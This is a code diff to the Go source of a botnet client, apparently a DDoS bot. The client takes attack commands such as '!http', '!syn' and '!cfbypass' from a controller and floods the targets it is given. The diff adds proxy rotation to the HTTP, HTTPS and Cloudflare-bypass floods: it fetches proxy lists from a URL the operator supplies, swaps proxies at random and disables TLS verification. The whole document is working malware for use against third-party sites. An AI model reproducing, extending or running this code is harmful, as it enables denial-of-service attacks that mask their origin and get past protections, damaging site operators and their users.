@@ -36,8 +36,8 @@ import (
 var debugMode = true
 
 // Obfuscated config - multi-layer encoding (setup.py generates this)
-const gothTits = "HtJ9e/5f9twQ2hMn1oTUnCyS88/q" //change me run setup.py
-const cryptSeed = "7b32e8e1"                    //change me run setup.py
+const gothTits = "SCs5ugBTD4ffdss453r3sfd" //change me run setup.py
+const cryptSeed = "68ff64e5"                    //change me run setup.py
 
 // DNS servers for TXT record lookups (shuffled for load balancing)
 var lizardSquad = []string{
@@ -410,8 +410,8 @@ func dialga() string {
 }
 
 const (
-	magicCode       = "saj95sciW1zQSXD9" //change this per campaign
-	protocolVersion = "r2.7-stable"      //change this per campaign
+	magicCode       = "oDU92ei#0OZqRueu" //change this per campaign
+	protocolVersion = "proto55"             //change this per campaign
 )
 
 var (
@@ -425,6 +425,10 @@ var (
 	aptStopChan            = make(chan struct{})
 	aptStopMutex     sync.Mutex
 	aptAttackRunning bool
+
+	// Proxy support for L7 attacks
+	proxyList      []string
+	proxyListMutex sync.RWMutex
 )
 
 const equationGroup = 256
@@ -890,7 +894,35 @@ func blackEnergy(conn net.Conn, command string) error {
 		conn.Write([]byte("STOP: All attacks terminated\n"))
 		return nil
 	case "!udpflood", "!tcpflood", "!http", "!ack", "!gre", "!syn", "!dns", "!https", "!tls", "!cfbypass":
-		if len(fields) != 4 {
+		// Check for proxy mode: !method target port duration -p proxyURL
+		useProxy := false
+		proxyURL := ""
+		minFields := 4
+
+		// Check if -p flag is present for L7 methods
+		if (cmd == "!http" || cmd == "!https" || cmd == "!tls" || cmd == "!cfbypass") && len(fields) >= 6 {
+			if fields[4] == "-p" {
+				useProxy = true
+				proxyURL = fields[5]
+				// Fetch proxies from URL
+				proxies, err := meowth(proxyURL)
+				if err != nil {
+					conn.Write([]byte(fmt.Sprintf("ERROR: Failed to fetch proxies: %v\n", err)))
+					return nil
+				}
+				if len(proxies) == 0 {
+					conn.Write([]byte("ERROR: No proxies found in the list\n"))
+					return nil
+				}
+				// Update global proxy list
+				proxyListMutex.Lock()
+				proxyList = proxies
+				proxyListMutex.Unlock()
+				conn.Write([]byte(fmt.Sprintf("Loaded %d proxies from %s\n", len(proxies), proxyURL)))
+			}
+		}
+
+		if len(fields) < minFields {
 			return fmt.Errorf("invalid format")
 		}
 		target := fields[1]
@@ -902,10 +934,25 @@ func blackEnergy(conn net.Conn, command string) error {
 		case "!tcpflood":
 			go gengar(target, targetPort, duration)
 		case "!http":
+			if useProxy {
+				go alakazamProxy(target, targetPort, duration, true)
+				conn.Write([]byte(fmt.Sprintf("Proxy attack started: %s on %s:%d for %d seconds (using proxies)\n", cmd, target, targetPort, duration)))
+				return nil
+			}
 			go alakazam(target, targetPort, duration)
 		case "!https", "!tls":
+			if useProxy {
+				go machampProxy(target, targetPort, duration, true)
+				conn.Write([]byte(fmt.Sprintf("Proxy attack started: %s on %s:%d for %d seconds (using proxies)\n", cmd, target, targetPort, duration)))
+				return nil
+			}
 			go machamp(target, targetPort, duration)
 		case "!cfbypass":
+			if useProxy {
+				go gyaradosProxy(target, targetPort, duration, true)
+				conn.Write([]byte(fmt.Sprintf("Proxy attack started: %s on %s:%d for %d seconds (using proxies)\n", cmd, target, targetPort, duration)))
+				return nil
+			}
 			go gyarados(target, targetPort, duration)
 		case "!syn":
 			go dragonite(target, targetPort, duration)
@@ -1049,6 +1096,101 @@ func main() {
 	}
 }
 
+// fetchProxies => meowth - Fetch HTTP/S proxies from a URL
+// Supports formats: ip:port, user:pass@host:port, http://ip:port, http://user:pass@host:port
+func meowth(proxyURL string) ([]string, error) {
+	deoxys("meowth: Fetching proxies from: %s", proxyURL)
+	client := &http.Client{Timeout: 30 * time.Second}
+	resp, err := client.Get(proxyURL)
+	if err != nil {
+		deoxys("meowth: Failed to fetch proxies: %v", err)
+		return nil, err
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode != http.StatusOK {
+		return nil, fmt.Errorf("status: %d", resp.StatusCode)
+	}
+
+	var proxies []string
+	scanner := bufio.NewScanner(resp.Body)
+	for scanner.Scan() {
+		line := strings.TrimSpace(scanner.Text())
+		if line == "" || strings.HasPrefix(line, "#") {
+			continue
+		}
+		// Support formats:
+		// - ip:port (simple)
+		// - user:pass@host:port (authenticated without scheme)
+		// - http://ip:port
+		// - http://user:pass@host:port (authenticated)
+		// - https://ip:port
+		// - https://user:pass@host:port
+		if !strings.HasPrefix(line, "http://") && !strings.HasPrefix(line, "https://") {
+			// Check if it contains @ (authenticated proxy without scheme)
+			if strings.Contains(line, "@") {
+				line = "http://" + line
+			} else {
+				line = "http://" + line
+			}
+		}
+		// Validate the proxy URL can be parsed
+		if _, err := url.Parse(line); err != nil {
+			deoxys("meowth: Skipping invalid proxy: %s (%v)", line, err)
+			continue
+		}
+		proxies = append(proxies, line)
+	}
+
+	if err := scanner.Err(); err != nil {
+		return nil, err
+	}
+
+	deoxys("meowth: Loaded %d proxies", len(proxies))
+	return proxies, nil
+}
+
+// getRandomProxy => persian - Get a random proxy from the list
+func persian() string {
+	proxyListMutex.RLock()
+	defer proxyListMutex.RUnlock()
+	if len(proxyList) == 0 {
+		return ""
+	}
+	return proxyList[rand.Intn(len(proxyList))]
+}
+
+// createProxyClient => meowstic - Create an HTTP client with proxy support
+func meowstic(proxyAddr string, timeout time.Duration) (*http.Client, error) {
+	proxyURL, err := url.Parse(proxyAddr)
+	if err != nil {
+		return nil, err
+	}
+
+	transport := &http.Transport{
+		Proxy: http.ProxyURL(proxyURL),
+		TLSClientConfig: &tls.Config{
+			InsecureSkipVerify: true,
+			MinVersion:         tls.VersionTLS12,
+		},
+		DisableKeepAlives:     false,
+		MaxIdleConns:          100,
+		IdleConnTimeout:       90 * time.Second,
+		ResponseHeaderTimeout: timeout,
+	}
+
+	return &http.Client{
+		Transport: transport,
+		Timeout:   timeout,
+		CheckRedirect: func(req *http.Request, via []*http.Request) error {
+			if len(via) >= 10 {
+				return fmt.Errorf("too many redirects")
+			}
+			return nil
+		},
+	}, nil
+}
+
 // DNS response type => magikarp
 type magikarp struct {
 	Answer []struct {
@@ -1172,8 +1314,13 @@ var eevee = []string{
 	"Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; rv:11.0) like Gecko",
 }
 
-// performHTTPFlood => alakazam
+// performHTTPFlood => alakazam - Updated with proxy support
 func alakazam(target string, targetPort, duration int) {
+	alakazamProxy(target, targetPort, duration, false)
+}
+
+// performHTTPFloodWithProxy => alakazamProxy - HTTP flood with optional proxy support
+func alakazamProxy(target string, targetPort, duration int, useProxy bool) {
 	rand.Seed(time.Now().UnixNano())
 	stopCh := raichu()
 	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
@@ -1191,7 +1338,21 @@ func alakazam(target string, targetPort, duration int) {
 		wg.Add(1)
 		go func() {
 			defer wg.Done()
-			client := &http.Client{}
+			var client *http.Client
+			if useProxy {
+				proxyAddr := persian()
+				if proxyAddr != "" {
+					var err error
+					client, err = meowstic(proxyAddr, 30*time.Second)
+					if err != nil {
+						client = &http.Client{Timeout: 30 * time.Second}
+					}
+				} else {
+					client = &http.Client{Timeout: 30 * time.Second}
+				}
+			} else {
+				client = &http.Client{Timeout: 30 * time.Second}
+			}
 			for {
 				select {
 				case <-ctx.Done():
@@ -1199,6 +1360,16 @@ func alakazam(target string, targetPort, duration int) {
 				case <-stopCh:
 					return
 				default:
+					// Rotate proxy periodically in proxy mode
+					if useProxy && rand.Intn(100) < 10 {
+						proxyAddr := persian()
+						if proxyAddr != "" {
+							newClient, err := meowstic(proxyAddr, 30*time.Second)
+							if err == nil {
+								client = newClient
+							}
+						}
+					}
 					body := make([]byte, 1024)
 					req, err := http.NewRequest("POST", targetURL, bytes.NewReader(body))
 					if err != nil {
@@ -1218,8 +1389,13 @@ func alakazam(target string, targetPort, duration int) {
 	wg.Wait()
 }
 
-// performHTTPSFlood => machamp
+// performHTTPSFlood => machamp - Updated with proxy support
 func machamp(target string, targetPort, duration int) {
+	machampProxy(target, targetPort, duration, false)
+}
+
+// performHTTPSFloodWithProxy => machampProxy - HTTPS flood with optional proxy support
+func machampProxy(target string, targetPort, duration int, useProxy bool) {
 	rand.Seed(time.Now().UnixNano())
 	stopCh := raichu()
 	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
@@ -1235,6 +1411,85 @@ func machamp(target string, targetPort, duration int) {
 	if idx := strings.Index(hostname, ":"); idx != -1 {
 		hostname = hostname[:idx]
 	}
+
+	// For proxy mode, use HTTP client with proxy
+	if useProxy {
+		scheme := "https"
+		targetURL := fmt.Sprintf("%s://%s:%d", scheme, hostname, targetPort)
+		paths := []string{"/", "/index.html", "/api", "/search", "/login", "/wp-admin"}
+		methods := []string{"GET", "POST", "HEAD"}
+
+		for i := 0; i < cozyBear; i++ {
+			wg.Add(1)
+			go func() {
+				defer wg.Done()
+				var client *http.Client
+				proxyAddr := persian()
+				if proxyAddr != "" {
+					var err error
+					client, err = meowstic(proxyAddr, 30*time.Second)
+					if err != nil {
+						return
+					}
+				} else {
+					return // No proxy available, skip this worker
+				}
+
+				for {
+					select {
+					case <-ctx.Done():
+						return
+					case <-stopCh:
+						return
+					default:
+						// Rotate proxy periodically
+						if rand.Intn(100) < 10 {
+							proxyAddr := persian()
+							if proxyAddr != "" {
+								newClient, err := meowstic(proxyAddr, 30*time.Second)
+								if err == nil {
+									client = newClient
+								}
+							}
+						}
+
+						method := methods[rand.Intn(len(methods))]
+						path := paths[rand.Intn(len(paths))]
+						ua := eevee[rand.Intn(len(eevee))]
+						reqURL := fmt.Sprintf("%s%s", targetURL, path)
+
+						var req *http.Request
+						var err error
+						if method == "POST" {
+							body := turla(rand.Intn(1024) + 256)
+							req, err = http.NewRequest(method, reqURL, strings.NewReader(body))
+						} else {
+							req, err = http.NewRequest(method, reqURL, nil)
+						}
+						if err != nil {
+							continue
+						}
+
+						req.Header.Set("Host", hostname)
+						req.Header.Set("User-Agent", ua)
+						req.Header.Set("Accept", "text/html,application/xhtml+xml")
+						req.Header.Set("Connection", "keep-alive")
+
+						resp, err := client.Do(req)
+						if resp != nil {
+							io.Copy(io.Discard, resp.Body)
+							resp.Body.Close()
+						}
+						atomic.AddInt64(&requestCount, 1)
+					}
+				}
+			}()
+		}
+		wg.Wait()
+		return
+	}
+
+	// Original direct connection mode
 	resolvedIP, err := lucario(target)
 	if err != nil {
 		return
@@ -1329,6 +1584,36 @@ func zorua() *ditto {
 	}
 }
 
+// zoruaWithProxy => zorua with proxy support
+func zoruaWithProxy(proxyAddr string) *ditto {
+	jar, _ := zoroark()
+	proxyURL, err := url.Parse(proxyAddr)
+	if err != nil {
+		return zorua() // Fallback to non-proxy version
+	}
+	return &ditto{
+		cookies:   nil,
+		userAgent: eevee[rand.Intn(len(eevee))],
+		client: &http.Client{
+			Timeout: 30 * time.Second,
+			Jar:     jar,
+			Transport: &http.Transport{
+				Proxy:             http.ProxyURL(proxyURL),
+				TLSClientConfig:   &tls.Config{InsecureSkipVerify: true, MinVersion: tls.VersionTLS12},
+				DisableKeepAlives: false,
+				MaxIdleConns:      100,
+				IdleConnTimeout:   90 * time.Second,
+			},
+			CheckRedirect: func(req *http.Request, via []*http.Request) error {
+				if len(via) >= 10 {
+					return fmt.Errorf("too many redirects")
+				}
+				return nil
+			},
+		},
+	}
+}
+
 func zoroark() (http.CookieJar, error) {
 	return &mimikyu{cookies: make(map[string][]*http.Cookie)}, nil
 }
@@ -1382,8 +1667,13 @@ func (s *ditto) gastly(targetURL string) error {
 	return nil
 }
 
-// performCFBypass => gyarados
+// performCFBypass => gyarados - Updated with proxy support
 func gyarados(target string, targetPort, duration int) {
+	gyaradosProxy(target, targetPort, duration, false)
+}
+
+// performCFBypassWithProxy => gyaradosProxy - CF bypass with optional proxy support
+func gyaradosProxy(target string, targetPort, duration int, useProxy bool) {
 	rand.Seed(time.Now().UnixNano())
 	stopCh := raichu()
 	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
@@ -1411,7 +1701,17 @@ func gyarados(target string, targetPort, duration int) {
 		wg.Add(1)
 		go func() {
 			defer wg.Done()
-			session := zorua()
+			var session *ditto
+			if useProxy {
+				proxyAddr := persian()
+				if proxyAddr != "" {
+					session = zoruaWithProxy(proxyAddr)
+				} else {
+					session = zorua()
+				}
+			} else {
+				session = zorua()
+			}
 			if session.gastly(targetURL) == nil {
 				atomic.AddInt64(&bypassCount, 1)
 			}
@@ -1422,6 +1722,14 @@ func gyarados(target string, targetPort, duration int) {
 				case <-stopCh:
 					return
 				default:
+					// Rotate proxy periodically in proxy mode
+					if useProxy && rand.Intn(100) < 5 {
+						proxyAddr := persian()
+						if proxyAddr != "" {
+							session = zoruaWithProxy(proxyAddr)
+							session.gastly(targetURL) // Re-bypass with new proxy
+						}
+					}
 					path := paths[rand.Intn(len(paths))]
 					reqURL := fmt.Sprintf("%s://%s:%d%s", scheme, hostname, targetPort, path)
 					req, err := http.NewRequest("GET", reqURL, nil)
